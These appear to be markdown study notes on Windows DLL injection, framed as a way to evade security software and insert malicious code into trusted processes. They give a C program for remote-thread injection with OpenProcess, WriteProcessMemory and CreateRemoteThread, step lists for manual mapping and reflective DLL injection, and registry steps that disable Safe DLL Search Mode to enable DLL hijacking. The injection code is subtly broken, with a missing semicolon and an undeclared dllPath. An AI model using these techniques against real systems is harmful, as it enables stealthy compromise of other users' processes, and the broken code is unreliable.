Evades detection by security software.

Inserts malicious code into trusted processes.

## LoadLibrary
```c
#include <windows.h>
#include <stdio.h>

int main() {
    // Using LoadLibrary to load a DLL into the current process
    HMODULE hModule = LoadLibrary("example.dll");
    if (hModule == NULL) {
        printf("Failed to load example.dll\n");
        return -1;
    }
    printf("Successfully loaded example.dll\n");

    return 0;
}
```
- Legitimate loading of dll into current process

```c
#include <windows.h>
#include <stdio.h>

int main() {
    // Using LoadLibrary for DLL injection
    // First, we need to get a handle to the target process
    DWORD targetProcessId = 123456 // The ID of the target process
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetProcessId);
    if (hProcess == NULL) {
        printf("Failed to open target process\n");
        return -1;
    }

    // Next, we need to allocate memory in the target process for the DLL path
    LPVOID dllPathAddressInRemoteMemory = VirtualAllocEx(hProcess, NULL, strlen(dllPath), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (dllPathAddressInRemoteMemory == NULL) {
        printf("Failed to allocate memory in target process\n");
        return -1;
    }

    // Write the DLL path to the allocated memory in the target process
    BOOL succeededWriting = WriteProcessMemory(hProcess, dllPathAddressInRemoteMemory, dllPath, strlen(dllPath), NULL);
    if (!succeededWriting) {
        printf("Failed to write DLL path to target process\n");
        return -1;
    }

    // Get the address of LoadLibrary in kernel32.dll
    LPVOID loadLibraryAddress = (LPVOID)GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
    if (loadLibraryAddress == NULL) {
        printf("Failed to get address of LoadLibraryA\n");
        return -1;
    }

    // Create a remote thread in the target process that starts at LoadLibrary and points to the DLL path
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibraryAddress, dllPathAddressInRemoteMemory, 0, NULL);
    if (hThread == NULL) {
        printf("Failed to create remote thread in target process\n");
        return -1;
    }

    printf("Successfully injected example.dll into target process\n");

    return 0;
}
```
- Use of LoadLibrary for DLL injection

## Manual Mapping
1. Load the DLL as raw data into the injecting process.
2. Map the DLL sections into the targeted process.
3. Inject shellcode into the target process and execute it. This shellcode relocates the DLL, rectifies the imports, executes the Thread Local Storage (TLS) callbacks, and finally calls the DLL main.


## Reflective DLL injection
1. Execution control is transferred to the library's ReflectiveLoader function, an exported function found in the library's export table. This can happen either via CreateRemoteThread() or a minimal bootstrap shellcode.
2. As the library's image currently resides in an arbitrary memory location, the ReflectiveLoader initially calculates its own image's current memory location to parse its own headers for later use.
3. The ReflectiveLoader then parses the host process's kernel32.dll export table to calculate the addresses of three functions needed by the loader, namely LoadLibraryA, GetProcAddress, and VirtualAlloc.
4. The ReflectiveLoader now allocates a continuous memory region where it will proceed to load its own image. The location isn't crucial; the loader will correctly relocate the image later.
5. The library's headers and sections are loaded into their new memory locations.
6. The ReflectiveLoader then processes the newly loaded copy of its image's import table, loading any additional libraries and resolving their respective imported function addresses.
7. The ReflectiveLoader then processes the newly loaded copy of its image's relocation table.
8. The ReflectiveLoader then calls its newly loaded image's entry point function, DllMain, with DLL_PROCESS_ATTACH. The library has now been successfully loaded into memory.
9. Finally, the ReflectiveLoader returns execution to the initial bootstrap shellcode that called it, or if it were called via CreateRemoteThread, the thread would terminate."


 ## DLL Hijacking

The default DLL search order with Safe DLL Search Mode activated has the user's current directory further down in the search order

**Deactivate Safe DLL Search Mode
1. Press Windows key + R to open the Run dialog box.
2. Type in Regedit and press Enter. This will open the Registry Editor.
3. Navigate to HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager.
4. In the right pane, look for the SafeDllSearchMode value. If it does not exist, right-click the blank space of the folder or right-click the Session Manager folder, select New and then DWORD (32-bit) Value. Name this new value as SafeDllSearchMode.
5. Double-click SafeDllSearchMode. In the Value data field, enter 1 to enable and 0 to disable Safe DLL Search Mode.
6. Click OK, close the Registry Editor and Reboot the system for the changes to take effect.

To find what DLLs a process is running use:
- Process Explorer
- PE Explorer

